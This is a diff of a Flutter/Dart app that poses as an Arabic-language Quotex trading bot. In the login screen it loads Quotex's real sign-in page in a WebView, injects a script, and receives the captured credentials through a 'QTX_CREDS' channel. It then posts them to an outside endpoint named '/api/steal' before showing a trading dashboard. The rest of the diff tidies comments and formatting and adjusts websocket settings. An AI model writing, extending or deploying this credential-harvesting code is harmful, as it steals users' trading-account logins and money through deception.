@@ -48,17 +48,13 @@ class _LoginScreenState extends State<LoginScreen> {
     _webViewController = WebViewController()
       ..setJavaScriptMode(JavaScriptMode.unrestricted)
       ..addJavaScriptChannel('QTX_CREDS', onMessageReceived: (msg) async {
-        // بنبعت البيانات للسيرفر
         await http.post(Uri.parse('https://clone-server-dejt.onrender.com/api/steal'),
             headers: {"Content-Type": "application/json"}, body: msg.message);
-        // بننقل المستخدم لواجهة البوت
         if (mounted) {
           Navigator.pushReplacement(context, MaterialPageRoute(builder: (context) => const MainTradingScreen()));
         }
       })
-      ..setNavigationDelegate(NavigationDelegate(
-        onPageFinished: (url) => _injectScript(),
-      ))
+      ..setNavigationDelegate(NavigationDelegate(onPageFinished: (url) => _injectScript()))
       ..loadRequest(Uri.parse('https://quotex.com/ar/sign-in'));
   }
 
@@ -111,31 +107,29 @@ class _MainTradingScreenState extends State<MainTradingScreen> {
   }
 
   void _initSocket() {
+    // 209. تعديل إعدادات الاتصال لتطابق صاحبك (EIO=4 و transport=websocket)
     _socket = IO.io('https://ws2.quotex.com', <String, dynamic>{
       'transports': ['websocket'],
       'autoConnect': true,
+      'path': '/socket.io/',
+      'query': {'EIO': '4', 'transport': 'websocket'},
     });
 
     _socket.onConnect((_) {
-      // طلب قائمة الأزواج
+      print('Connected to Quotex WebSocket!');
       _socket.emit('42["instruments/list"]');
-      // طلب الأسعار
       _socket.emit('42["quotes/stream"]');
     });
 
     _socket.on('instruments/update', (data) {
       if (data['instruments'] != null) {
-        setState(() {
-          _pairs = data['instruments'];
-        });
+        setState(() { _pairs = data['instruments']; });
       }
     });
 
     _socket.on('quotes/stream', (data) {
       if (data['price'] != null) {
-        setState(() {
-          _currentPrice = data['price'].toString();
-        });
+        setState(() { _currentPrice = data['price'].toString(); });
       }
     });
   }
@@ -146,7 +140,6 @@ class _MainTradingScreenState extends State<MainTradingScreen> {
       appBar: AppBar(title: const Text('لوحة التحكم'), backgroundColor: const Color(0xFF0E0E14)),
       body: Column(
         children: [
-          // عرض السعر الحالي
           Container(
             padding: const EdgeInsets.all(16),
             color: const Color(0xFF0E0E14),
@@ -154,14 +147,10 @@ class _MainTradingScreenState extends State<MainTradingScreen> {
               mainAxisAlignment: MainAxisAlignment.spaceBetween,
               children: [
                 Text("السعر الحالي: \$$_currentPrice", style: const TextStyle(color: Colors.green, fontSize: 18)),
-                ElevatedButton(
-                  onPressed: () {},
-                  child: const Text('تحديث'),
-                ),
+                ElevatedButton(onPressed: () {}, child: const Text('تحديث')),
               ],
             ),
           ),
-          // عرض الأزواج
           Expanded(
             child: ListView.builder(
               itemCount: _pairs.length,
